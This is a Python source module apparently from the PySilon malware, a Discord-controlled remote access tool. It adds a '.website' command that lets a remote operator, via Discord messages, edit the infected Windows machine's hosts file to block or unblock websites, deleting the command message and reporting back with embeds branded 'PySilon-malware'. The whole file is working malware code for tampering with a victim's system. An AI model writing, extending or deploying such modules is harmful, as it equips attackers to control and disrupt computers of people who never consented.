#<imports>
import discord
import ctypes
from urllib.parse import urlparse
#</imports>

#<function>

def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'

    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path

    return None
#</function>

#<command>

@client.command(name="website")
async def website_blocker(ctx, option=None, website=None):
    await ctx.message.delete()
    if not IsAdmin():
        embed = discord.Embed(title="📛 Error", description=f'```This command requires (UAC) elevation.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        return await ctx.send(embed=embed)
    if option == "block":
        if website != None:
            if not website.startswith("https://") or not website.startswith("http://"):
                website = "http://" + website 
            print(website)
            parsed_url = urlparse(website)
            host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
            hosts_file_path = get_hosts_file_path()

            if hosts_file_path:
                with open(hosts_file_path, 'a') as hosts_file:
                    hosts_file.write(host_entry)
                embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. \nUnblock it by using .website unblock [websiteurl]```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)

            else:
                embed = discord.Embed(title="📛 Error", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website block <https://example.com>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

    elif option == "unblock":
        if website != None:
            website = website.replace("https://", "")
            website = website.replace("http://", "")
            hosts_file_path = get_hosts_file_path()
            if hosts_file_path:
                with open(hosts_file_path, 'r') as hosts_file:
                    lines = hosts_file.readlines()
                filtered_lines = [line for line in lines if website not in line]
                with open(hosts_file_path, 'w') as hosts_file:
                    hosts_file.writelines(filtered_lines)
                embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website unblock <example.com>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔴 Hold on!", description=f'```Syntax: .website <block/unblock> <https://example.com>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
#</command>